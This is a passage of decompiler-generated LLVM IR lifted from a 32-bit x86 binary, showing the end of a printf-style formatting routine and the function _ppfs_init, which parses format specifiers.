  %v3_805b7bb = load i32, i32* %v2_805b7bb, align 4
  %v5_805b7bb = add i32 %v1_805b7b9, -12
  %v6_805b7bb = inttoptr i32 %v5_805b7bb to i32*
  store i32 %v3_805b7bb, i32* %v6_805b7bb, align 4
  %v0_805b7c2 = load i32, i32* @ebp, align 4
  %v1_805b7c2 = add i32 %v0_805b7c2, ptrtoint (i32* @global_var_806cbd9.733 to i32)
  store i32 %v1_805b7c2, i32* %eax.global-to-local, align 4
  %v2_805b7c8 = add i32 %v1_805b7b9, -16
  %v3_805b7c8 = inttoptr i32 %v2_805b7c8 to i32*
  store i32 %v1_805b7c2, i32* %v3_805b7c8, align 4
  %v0_805b7c9 = load i32, i32* %stack_var_-364, align 4
  %v4_805b7c9 = inttoptr i32 %v0_805b7c9 to i8*
  %v5_805b7c9 = call i32 @__GI_fputs_unlocked(i8* %v4_805b7c9, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805b7c9, i32* %eax.global-to-local, align 4
  %v0_805b7ce = load i32, i32* @esp, align 4
  %v1_805b7ce = add i32 %v0_805b7ce, 384
  %v2_805b7ce = inttoptr i32 %v1_805b7ce to i32*
  %v3_805b7ce = load i32, i32* %v2_805b7ce, align 4
  store i32 %v3_805b7ce, i32* @eax, align 4
  %v0_805b7d5 = load i32, i32* @ebx, align 4
  store i32 %v0_805b7d5, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_805b7dc = call i32 @_charpad()
  store i32 %v0_805b7dc, i32* %eax.global-to-local, align 4
  %v0_805b7e1 = load i32, i32* @esp, align 4
  %v1_805b7e1 = add i32 %v0_805b7e1, 16
  %v1_805b7e4 = load i32, i32* @ebx, align 4
  %v12_805b7e4 = icmp eq i32 %v0_805b7dc, %v1_805b7e4
  %v1_805b7e6 = icmp eq i1 %v12_805b7e4, false
  br i1 %v1_805b7e6, label %dec_label_pc_805b8a7, label %dec_label_pc_805b7ec

dec_label_pc_805b7ec:                             ; preds = %dec_label_pc_805b7b9
  %v1_805b7ec = add i32 %v0_805b7e1, 356
  %v2_805b7ec = inttoptr i32 %v1_805b7ec to i32*
  %v3_805b7ec = load i32, i32* %v2_805b7ec, align 4
  %v4_805b7ec = icmp eq i32 %v3_805b7ec, 0
  %v1_805b7f4 = icmp eq i1 %v4_805b7ec, false
  br i1 %v1_805b7f4, label %dec_label_pc_805b818, label %dec_label_pc_805b7f6

dec_label_pc_805b7f6:                             ; preds = %dec_label_pc_805b7ec
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805b7f8 = load i32, i32* @esi, align 4
  %v1_805b7f8 = icmp eq i32 %v0_805b7f8, 0
  br i1 %v1_805b7f8, label %dec_label_pc_805b80e, label %dec_label_pc_805b7fc

dec_label_pc_805b7fc:                             ; preds = %dec_label_pc_805b7f6
  %v2_805b7fc = add i32 %v0_805b7e1, 12
  %v3_805b7fc = inttoptr i32 %v2_805b7fc to i32*
  store i32 0, i32* %v3_805b7fc, align 4
  %v1_805b7fd = add i32 %v0_805b7e1, 384
  %v2_805b7fd = inttoptr i32 %v1_805b7fd to i32*
  %v3_805b7fd = load i32, i32* %v2_805b7fd, align 4
  %v5_805b7fd = add i32 %v0_805b7e1, 8
  %v6_805b7fd = inttoptr i32 %v5_805b7fd to i32*
  store i32 %v3_805b7fd, i32* %v6_805b7fd, align 4
  %v0_805b804 = load i32, i32* @esi, align 4
  %v2_805b804 = add i32 %v0_805b7e1, 4
  %v3_805b804 = inttoptr i32 %v2_805b804 to i32*
  store i32 %v0_805b804, i32* %v3_805b804, align 4
  %v0_805b805 = load i32, i32* @edi, align 4
  %v3_805b805 = inttoptr i32 %v0_805b7e1 to i32*
  store i32 %v0_805b805, i32* %v3_805b805, align 4
  %v0_805b806 = load i32, i32* %stack_var_-364, align 4
  %v4_805b806 = call i32 @__stdio_fwrite(i32 %v0_805b806, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805b806, i32* %eax.global-to-local, align 4
  %v0_805b80b = load i32, i32* @esp, align 4
  %v1_805b80b = add i32 %v0_805b80b, 16
  %v1_805b80e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b80e

dec_label_pc_805b80e:                             ; preds = %dec_label_pc_805b7f6, %dec_label_pc_805b7fc
  %v0_805b87946 = phi i32 [ %v1_805b7e1, %dec_label_pc_805b7f6 ], [ %v1_805b80b, %dec_label_pc_805b7fc ]
  %v1_805b80e = phi i32 [ 0, %dec_label_pc_805b7f6 ], [ %v1_805b80e.pre, %dec_label_pc_805b7fc ]
  %v0_805b80e = phi i32 [ 0, %dec_label_pc_805b7f6 ], [ %v4_805b806, %dec_label_pc_805b7fc ]
  %v12_805b80e = icmp eq i32 %v0_805b80e, %v1_805b80e
  %v1_805b810 = icmp eq i1 %v12_805b80e, false
  br i1 %v1_805b810, label %dec_label_pc_805b8a7, label %dec_label_pc_805b879

dec_label_pc_805b818:                             ; preds = %dec_label_pc_805b7ec
  %v1_805b818 = add i32 %v0_805b7e1, 348
  %v2_805b818 = inttoptr i32 %v1_805b818 to i32*
  store i32 0, i32* %v2_805b818, align 4
  %v0_805b8757 = load i32, i32* @esi, align 4
  %v1_805b8758 = icmp eq i32 %v0_805b8757, 0
  %v1_805b87715 = icmp eq i1 %v1_805b8758, false
  br i1 %v1_805b87715, label %dec_label_pc_805b825, label %dec_label_pc_805b818.dec_label_pc_805b879.loopexit_crit_edge

dec_label_pc_805b818.dec_label_pc_805b879.loopexit_crit_edge: ; preds = %dec_label_pc_805b818
  %v0_805b879.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805b879

dec_label_pc_805b825:                             ; preds = %dec_label_pc_805b818, %dec_label_pc_805b873
  %v0_805b825 = phi i32 [ %v2_805b873, %dec_label_pc_805b873 ], [ %v0_805b8757, %dec_label_pc_805b818 ]
  %tmp93 = icmp ult i32 %v0_805b825, 129
  br i1 %tmp93, label %dec_label_pc_805b834, label %dec_label_pc_805b82f

dec_label_pc_805b82f:                             ; preds = %dec_label_pc_805b825
  br label %dec_label_pc_805b834

dec_label_pc_805b834:                             ; preds = %dec_label_pc_805b825, %dec_label_pc_805b82f
  %storemerge94 = phi i32 [ 128, %dec_label_pc_805b82f ], [ %v0_805b825, %dec_label_pc_805b825 ]
  store i32 %storemerge94, i32* %edx.global-to-local, align 4
  %v0_805b834 = load i32, i32* @esp, align 4
  %v1_805b834 = add i32 %v0_805b834, 332
  %v2_805b83b = add i32 %v0_805b834, -4
  %v3_805b83b = inttoptr i32 %v2_805b83b to i32*
  store i32 %v1_805b834, i32* %v3_805b83b, align 4
  %v0_805b83c = load i32, i32* %edx.global-to-local, align 4
  %v2_805b83c = add i32 %v0_805b834, -8
  %v3_805b83c = inttoptr i32 %v2_805b83c to i32*
  store i32 %v0_805b83c, i32* %v3_805b83c, align 4
  %v1_805b83d = add i32 %v0_805b834, 340
  store i32 %v1_805b83d, i32* %eax.global-to-local, align 4
  %v2_805b844 = add i32 %v0_805b834, -12
  %v3_805b844 = inttoptr i32 %v2_805b844 to i32*
  store i32 %v1_805b83d, i32* %v3_805b844, align 4
  %v1_805b845 = add i32 %v0_805b834, 204
  store i32 %v1_805b845, i32* @edi, align 4
  %v2_805b84c = add i32 %v0_805b834, -16
  %v3_805b84c = inttoptr i32 %v2_805b84c to i32*
  store i32 %v1_805b845, i32* %v3_805b84c, align 4
  %v0_805b84d = call i32 @__GI_wcsrtombs()
  store i32 %v0_805b84d, i32* @ebx, align 4
  %v0_805b854 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805b859 = icmp eq i32 %v0_805b84d, 0
  br i1 %v1_805b859, label %dec_label_pc_805b86f, label %dec_label_pc_805b85d

dec_label_pc_805b85d:                             ; preds = %dec_label_pc_805b834
  %v0_805b85d = load i32, i32* @ebp, align 4
  %v2_805b85d = add i32 %v0_805b854, 12
  %v3_805b85d = inttoptr i32 %v2_805b85d to i32*
  store i32 %v0_805b85d, i32* %v3_805b85d, align 4
  %v1_805b85e = add i32 %v0_805b854, 384
  %v2_805b85e = inttoptr i32 %v1_805b85e to i32*
  %v3_805b85e = load i32, i32* %v2_805b85e, align 4
  %v5_805b85e = add i32 %v0_805b854, 8
  %v6_805b85e = inttoptr i32 %v5_805b85e to i32*
  store i32 %v3_805b85e, i32* %v6_805b85e, align 4
  %v2_805b865 = add i32 %v0_805b854, 4
  %v3_805b865 = inttoptr i32 %v2_805b865 to i32*
  store i32 %v0_805b84d, i32* %v3_805b865, align 4
  %v0_805b866 = load i32, i32* @edi, align 4
  %v3_805b866 = inttoptr i32 %v0_805b854 to i32*
  store i32 %v0_805b866, i32* %v3_805b866, align 4
  %v0_805b867 = load i32, i32* %stack_var_-364, align 4
  %v4_805b867 = call i32 @__stdio_fwrite(i32 %v0_805b867, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805b867, i32* %eax.global-to-local, align 4
  %v0_805b86c = load i32, i32* @esp, align 4
  br label %dec_label_pc_805b86f

dec_label_pc_805b86f:                             ; preds = %dec_label_pc_805b834, %dec_label_pc_805b85d
  %v0_805b8a749.in = phi i32 [ %v0_805b854, %dec_label_pc_805b834 ], [ %v0_805b86c, %dec_label_pc_805b85d ]
  %v1_805b873 = phi i32 [ 0, %dec_label_pc_805b834 ], [ %v4_805b867, %dec_label_pc_805b85d ]
  %v0_805b8a749 = add i32 %v0_805b8a749.in, 16
  %v12_805b86f = icmp eq i32 %v1_805b873, %v0_805b84d
  %v1_805b871 = icmp eq i1 %v12_805b86f, false
  br i1 %v1_805b871, label %dec_label_pc_805b8a7, label %dec_label_pc_805b873

dec_label_pc_805b873:                             ; preds = %dec_label_pc_805b86f
  %v0_805b873 = load i32, i32* @esi, align 4
  %v2_805b873 = sub i32 %v0_805b873, %v1_805b873
  %v12_805b873 = icmp eq i32 %v2_805b873, 0
  store i32 %v2_805b873, i32* @esi, align 4
  %v1_805b877 = icmp eq i1 %v12_805b873, false
  br i1 %v1_805b877, label %dec_label_pc_805b825, label %dec_label_pc_805b879

dec_label_pc_805b879:                             ; preds = %dec_label_pc_805b873, %dec_label_pc_805b818.dec_label_pc_805b879.loopexit_crit_edge, %dec_label_pc_805b80e
  %v0_805b879 = phi i32 [ %v0_805b87946, %dec_label_pc_805b80e ], [ %v0_805b879.pre.pre, %dec_label_pc_805b818.dec_label_pc_805b879.loopexit_crit_edge ], [ %v0_805b8a749, %dec_label_pc_805b873 ]
  %v1_805b879 = add i32 %v0_805b879, 8
  %v2_805b879 = inttoptr i32 %v1_805b879 to i32*
  %v3_805b879 = load i32, i32* %v2_805b879, align 4
  store i32 %v3_805b879, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805b882 = add i32 %v0_805b879, 368
  %v2_805b882 = inttoptr i32 %v1_805b882 to i32*
  %v3_805b882 = load i32, i32* %v2_805b882, align 4
  store i32 %v3_805b882, i32* @eax, align 4
  %v0_805b889 = call i32 @_charpad()
  store i32 %v0_805b889, i32* %eax.global-to-local, align 4
  %v1_805b88e = load i32, i32* @esp, align 4
  %v2_805b88e = add i32 %v1_805b88e, 8
  %v3_805b88e = inttoptr i32 %v2_805b88e to i32*
  %v4_805b88e = load i32, i32* %v3_805b88e, align 4
  %v15_805b88e = icmp eq i32 %v0_805b889, %v4_805b88e
  %v1_805b892 = icmp eq i1 %v15_805b88e, false
  br i1 %v1_805b892, label %dec_label_pc_805b8a7, label %dec_label_pc_805b894

dec_label_pc_805b894:                             ; preds = %dec_label_pc_805b879, %dec_label_pc_805b60e, %dec_label_pc_805b43c
  %v0_805b894 = phi i32 [ %v1_805b88e, %dec_label_pc_805b879 ], [ %v0_805b894.pre, %dec_label_pc_805b60e ], [ %v1_805b45a, %dec_label_pc_805b43c ]
  %v1_805b894 = add i32 %v0_805b894, 16
  %v2_805b894 = inttoptr i32 %v1_805b894 to i32*
  %v3_805b894 = load i32, i32* %v2_805b894, align 4
  store i32 %v3_805b894, i32* @ebx, align 4
  store i32 %v3_805b894, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b394.backedge

dec_label_pc_805b89f:                             ; preds = %dec_label_pc_805b3d2
  %v1_805b89f = add i32 %v0_805b89f, 2
  store i32 %v1_805b89f, i32* @ebx, align 4
  br label %dec_label_pc_805b394.backedge

dec_label_pc_805b8a7:                             ; preds = %dec_label_pc_805b3be, %dec_label_pc_805b879, %dec_label_pc_805b80e, %dec_label_pc_805b7b9, %dec_label_pc_805b792, %dec_label_pc_805b702, %dec_label_pc_805b67d, %dec_label_pc_805b651, %dec_label_pc_805b5e5, %dec_label_pc_805b86f
  %v0_805b8a7 = phi i32 [ %v0_805b8a749, %dec_label_pc_805b86f ], [ %v0_805b8a7.pre.pre, %dec_label_pc_805b3be ], [ %v1_805b88e, %dec_label_pc_805b879 ], [ %v0_805b87946, %dec_label_pc_805b80e ], [ %v1_805b7e1, %dec_label_pc_805b7b9 ], [ %v1_805b7a7, %dec_label_pc_805b792 ], [ %v0_805b434.lcssa, %dec_label_pc_805b702 ], [ %v1_805b695, %dec_label_pc_805b67d ], [ %v1_805b668, %dec_label_pc_805b651 ], [ %v1_805b603, %dec_label_pc_805b5e5 ]
  %v1_805b8a7 = inttoptr i32 %v0_805b8a7 to i32*
  store i32 -1, i32* %v1_805b8a7, align 4
  br label %dec_label_pc_805b8ae

dec_label_pc_805b8ae:                             ; preds = %dec_label_pc_805b3c9, %dec_label_pc_805b337, %dec_label_pc_805b356, %dec_label_pc_805b8a7
  %v0_805b8ae = load i32, i32* @esp, align 4
  %v1_805b8ae = inttoptr i32 %v0_805b8ae to i32*
  %v2_805b8ae = load i32, i32* %v1_805b8ae, align 4
  store i32 %v2_805b8ae, i32* %eax.global-to-local, align 4
  %v1_805b8b1 = add i32 %v0_805b8ae, 348
  %v1_805b8b7 = inttoptr i32 %v1_805b8b1 to i32*
  %v2_805b8b7 = load i32, i32* %v1_805b8b7, align 4
  store i32 %v2_805b8b7, i32* @ebx, align 4
  %v3_805b8b8 = add i32 %v0_805b8ae, 356
  %v1_805b8b9 = inttoptr i32 %v3_805b8b8 to i32*
  %v2_805b8b9 = load i32, i32* %v1_805b8b9, align 4
  store i32 %v2_805b8b9, i32* @edi, align 4
  %v3_805b8b9 = add i32 %v0_805b8ae, 360
  %v1_805b8ba = inttoptr i32 %v3_805b8b9 to i32*
  %v2_805b8ba = load i32, i32* %v1_805b8ba, align 4
  store i32 %v2_805b8ba, i32* @ebp, align 4
  ret i32 %v2_805b8ae

; uselistorder directives
  uselistorder i32 %v1_805b89f, { 1, 0 }
  uselistorder i32 %v3_805b894, { 2, 3, 0, 1 }
  uselistorder i32 %v0_805b879, { 1, 0 }
  uselistorder i32 %v2_805b873, { 1, 2, 0 }
  uselistorder i32 %v0_805b8a749, { 1, 0 }
  uselistorder i32 %v1_805b873, { 1, 0 }
  uselistorder i32 %v0_805b854, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_805b84d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805b7e1, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_805b7b9, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805b792, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805b766, { 1, 0, 2 }
  uselistorder i32 %v6_805b753, { 1, 0 }
  uselistorder i32 %v1_805b750, { 1, 0 }
  uselistorder i32 %v0_805b749, { 0, 3, 2, 1 }
  uselistorder i32 %v1_805b6d3, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_805b6e3, { 2, 3, 1, 0 }
  uselistorder i32 %v0_805b690, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805b644, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_805b62a, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_805b5c3, { 1, 0, 2 }
  uselistorder i32 %v0_805b577, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_805b547, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_805b59a, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_805b523, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805b4dc, { 1, 0 }
  uselistorder i32 %v1_805b4e9, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_805b434, { 3, 10, 11, 5, 4, 7, 6, 8, 12, 0, 1, 2, 13, 9, 14, 15 }
  uselistorder i32 %v0_805b434.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_805b430, { 1, 0 }
  uselistorder i32 %v1_805b430.pre, { 1, 0 }
  uselistorder i32 %v1_805b42f, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_805b42c, { 1, 0 }
  uselistorder i32 %v2_805b43072, { 1, 0 }
  uselistorder i32 %v3_805b416, { 1, 0 }
  uselistorder i32 %v1_805b3d2, { 0, 2, 3, 1 }
  uselistorder i32 %v3_805b3c6, { 1, 0 }
  uselistorder i32 %v2_805b39e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805b3a2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_805b38c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 5, 4, 8, 0, 7, 6, 1, 9, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 25, 21, 22, 23, 26, 24, 27, 28, 29, 30 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 356, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_805b8ae, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805b8a7, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_805b86f, { 1, 0 }
  uselistorder label %dec_label_pc_805b834, { 1, 0 }
  uselistorder label %dec_label_pc_805b825, { 1, 0 }
  uselistorder label %dec_label_pc_805b80e, { 1, 0 }
  uselistorder label %dec_label_pc_805b7b9, { 1, 0 }
  uselistorder label %dec_label_pc_805b78b, { 1, 0 }
  uselistorder label %dec_label_pc_805b770, { 1, 0 }
  uselistorder label %dec_label_pc_805b75a, { 1, 0 }
  uselistorder label %dec_label_pc_805b746, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805b73a, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805b6d3, { 1, 0 }
  uselistorder label %dec_label_pc_805b6c6, { 1, 0 }
  uselistorder label %dec_label_pc_805b651, { 1, 0 }
  uselistorder label %dec_label_pc_805b5e5, { 1, 0 }
  uselistorder label %dec_label_pc_805b59a, { 1, 0 }
  uselistorder label %dec_label_pc_805b58b, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805b566, { 1, 0 }
  uselistorder label %dec_label_pc_805b551, { 1, 0 }
  uselistorder label %dec_label_pc_805b538, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805b4e9, { 1, 0 }
  uselistorder label %dec_label_pc_805b4d0, { 1, 0 }
  uselistorder label %dec_label_pc_805b4bc, { 1, 0 }
  uselistorder label %dec_label_pc_805b4b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805b498, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805b425, { 1, 0 }
  uselistorder label %dec_label_pc_805b41d, { 1, 0 }
  uselistorder label %dec_label_pc_805b3c9, { 1, 0 }
  uselistorder label %dec_label_pc_805b3be, { 1, 0 }
  uselistorder label %dec_label_pc_805b394.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805b8bc = load i32, i32* @esi, align 4
  %v0_805b8bd = load i32, i32* @ebx, align 4
  store i32 %v0_805b8bd, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_805b8d1 = bitcast i32* %arg1 to i8*
  %v4_805b8d1 = call i32 @__GI_memset(i8* %v3_805b8d1, i32 0, i32 188)
  store i32 %v4_805b8d1, i32* %eax.global-to-local, align 4
  %v0_805b8d6 = load i32, i32* @ebx, align 4
  %v1_805b8d6 = add i32 %v0_805b8d6, 24
  %v2_805b8d6 = inttoptr i32 %v1_805b8d6 to i32*
  %v3_805b8d6 = load i32, i32* %v2_805b8d6, align 4
  %v4_805b8d6 = add i32 %v3_805b8d6, -1
  store i32 %v4_805b8d6, i32* %v2_805b8d6, align 4
  %v0_805b8d9 = load i32, i32* @esi, align 4
  %v1_805b8d9 = load i32, i32* @ebx, align 4
  %v2_805b8d9 = inttoptr i32 %v1_805b8d9 to i32*
  store i32 %v0_805b8d9, i32* %v2_805b8d9, align 4
  %v0_805b8db = load i32, i32* @ebx, align 4
  %v1_805b8db = add i32 %v0_805b8db, 40
  store i32 %v1_805b8db, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805b8e6

dec_label_pc_805b8e6:                             ; preds = %dec_label_pc_805b8e6, %entry
  %v0_805b8e6 = phi i32 [ %v1_805b8ec, %dec_label_pc_805b8e6 ], [ %v1_805b8db, %entry ]
  %v1_805b8e6 = inttoptr i32 %v0_805b8e6 to i32*
  store i32 8, i32* %v1_805b8e6, align 4
  %v0_805b8ec = load i32, i32* %eax.global-to-local, align 4
  %v1_805b8ec = add i32 %v0_805b8ec, 4
  store i32 %v1_805b8ec, i32* %eax.global-to-local, align 4
  %v0_805b8ef = load i32, i32* %edx.global-to-local, align 4
  %v1_805b8ef = add i32 %v0_805b8ef, -1
  %v8_805b8ef = icmp eq i32 %v1_805b8ef, 0
  store i32 %v1_805b8ef, i32* %edx.global-to-local, align 4
  %v1_805b8f0 = icmp eq i1 %v8_805b8ef, false
  br i1 %v1_805b8f0, label %dec_label_pc_805b8e6, label %dec_label_pc_805b8f2

dec_label_pc_805b8f2:                             ; preds = %dec_label_pc_805b8e6
  %v0_805b8f2 = load i32, i32* @esi, align 4
  store i32 %v0_805b8f2, i32* %eax.global-to-local, align 4
  %v1_805b91d20 = inttoptr i32 %v0_805b8f2 to i8*
  %v2_805b91d21 = load i8, i8* %v1_805b91d20, align 1
  %v3_805b91d22 = zext i8 %v2_805b91d21 to i32
  %v5_805b91d23 = and i32 %v1_805b8ef, -256
  %v6_805b91d24 = or i32 %v3_805b91d22, %v5_805b91d23
  store i32 %v6_805b91d24, i32* %edx.global-to-local, align 4
  %v4_805b91f25 = icmp eq i8 %v2_805b91d21, 0
  %v1_805b92126 = icmp eq i1 %v4_805b91f25, false
  br i1 %v1_805b92126, label %dec_label_pc_805b8fb, label %dec_label_pc_805b923

dec_label_pc_805b8fb:                             ; preds = %dec_label_pc_805b8f2, %dec_label_pc_805b91d.backedge
  %v6_805b91d29 = phi i32 [ %v6_805b91d, %dec_label_pc_805b91d.backedge ], [ %v6_805b91d24, %dec_label_pc_805b8f2 ]
  %v2_805b91d28 = phi i8 [ %v2_805b91d, %dec_label_pc_805b91d.backedge ], [ %v2_805b91d21, %dec_label_pc_805b8f2 ]
  %v0_805b90027 = phi i32 [ %v0_805b900.be, %dec_label_pc_805b91d.backedge ], [ %v0_805b8f2, %dec_label_pc_805b8f2 ]
  %v10_805b8fb = icmp eq i8 %v2_805b91d28, 37
  %v1_805b8fe = icmp eq i1 %v10_805b8fb, false
  br i1 %v1_805b8fe, label %dec_label_pc_805b91c, label %dec_label_pc_805b900

dec_label_pc_805b900:                             ; preds = %dec_label_pc_805b8fb
  %v1_805b900 = add i32 %v0_805b90027, 1
  store i32 %v1_805b900, i32* %eax.global-to-local, align 4
  %v1_805b901 = inttoptr i32 %v1_805b900 to i8*
  %v2_805b901 = load i8, i8* %v1_805b901, align 1
  %v11_805b901 = icmp eq i8 %v2_805b901, 37
  br i1 %v11_805b901, label %dec_label_pc_805b91c, label %dec_label_pc_805b906

dec_label_pc_805b906:                             ; preds = %dec_label_pc_805b900
  %v1_805b909 = load i32, i32* @ebx, align 4
  %v2_805b909 = inttoptr i32 %v1_805b909 to i32*
  store i32 %v1_805b900, i32* %v2_805b909, align 4
  %v0_805b90b = load i32, i32* @ebx, align 4
  %v1_805b90c = inttoptr i32 %v0_805b90b to i32*
  %v2_805b90c = call i32 @_ppfs_parsespec(i32* %v1_805b90c)
  store i32 %v2_805b90c, i32* %eax.global-to-local, align 4
  %v2_805b914 = icmp slt i32 %v2_805b90c, 0
  br i1 %v2_805b914, label %dec_label_pc_805b927, label %dec_label_pc_805b918

dec_label_pc_805b918:                             ; preds = %dec_label_pc_805b906
  %v0_805b918 = load i32, i32* @ebx, align 4
  %v1_805b918 = inttoptr i32 %v0_805b918 to i32*
  %v2_805b918 = load i32, i32* %v1_805b918, align 4
  %v4_805b91d.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805b91d.backedge

dec_label_pc_805b91c:                             ; preds = %dec_label_pc_805b900, %dec_label_pc_805b8fb
  %v0_805b91c = phi i32 [ %v1_805b900, %dec_label_pc_805b900 ], [ %v0_805b90027, %dec_label_pc_805b8fb ]
  %v1_805b91c = add i32 %v0_805b91c, 1
  br label %dec_label_pc_805b91d.backedge

dec_label_pc_805b91d.backedge:                    ; preds = %dec_label_pc_805b91c, %dec_label_pc_805b918
  %v4_805b91d.be = phi i32 [ %v4_805b91d.pre.pre, %dec_label_pc_805b918 ], [ %v6_805b91d29, %dec_label_pc_805b91c ]
  %v0_805b900.be = phi i32 [ %v2_805b918, %dec_label_pc_805b918 ], [ %v1_805b91c, %dec_label_pc_805b91c ]
  store i32 %v0_805b900.be, i32* %eax.global-to-local, align 4
  %v1_805b91d = inttoptr i32 %v0_805b900.be to i8*
  %v2_805b91d = load i8, i8* %v1_805b91d, align 1
  %v3_805b91d = zext i8 %v2_805b91d to i32
  %v5_805b91d = and i32 %v4_805b91d.be, -256
  %v6_805b91d = or i32 %v3_805b91d, %v5_805b91d
  store i32 %v6_805b91d, i32* %edx.global-to-local, align 4
  %v4_805b91f = icmp eq i8 %v2_805b91d, 0
  %v1_805b921 = icmp eq i1 %v4_805b91f, false
  br i1 %v1_805b921, label %dec_label_pc_805b8fb, label %dec_label_pc_805b91d.dec_label_pc_805b923_crit_edge

dec_label_pc_805b91d.dec_label_pc_805b923_crit_edge: ; preds = %dec_label_pc_805b91d.backedge
  %v0_805b923.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b923

dec_label_pc_805b923:                             ; preds = %dec_label_pc_805b91d.dec_label_pc_805b923_crit_edge, %dec_label_pc_805b8f2
  %v0_805b923 = phi i32 [ %v0_805b923.pre, %dec_label_pc_805b91d.dec_label_pc_805b923_crit_edge ], [ %v0_805b8f2, %dec_label_pc_805b8f2 ]
  %v1_805b923 = load i32, i32* @ebx, align 4
  %v2_805b923 = inttoptr i32 %v1_805b923 to i32*
  store i32 %v0_805b923, i32* %v2_805b923, align 4
  br label %dec_label_pc_805b927

dec_label_pc_805b927:                             ; preds = %dec_label_pc_805b906, %dec_label_pc_805b923
  %storemerge = phi i32 [ 0, %dec_label_pc_805b923 ], [ -1, %dec_label_pc_805b906 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_805b927 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b927, i32* @edx, align 4
  %v2_805b928 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b928, i32* @ebx, align 4
  store i32 %v0_805b8bc, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_805b91d, { 1, 0 }
  uselistorder i8 %v2_805b91d, { 1, 2, 0 }
  uselistorder i32 %v0_805b900.be, { 2, 1, 0 }
  uselistorder i32 %v0_805b90027, { 1, 0 }
  uselistorder i32 %v0_805b8f2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805b8ef, { 0, 2, 1 }
  uselistorder i32 %v1_805b8ec, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_805b927, { 1, 0 }
  uselistorder label %dec_label_pc_805b8fb, { 1, 0 }
}

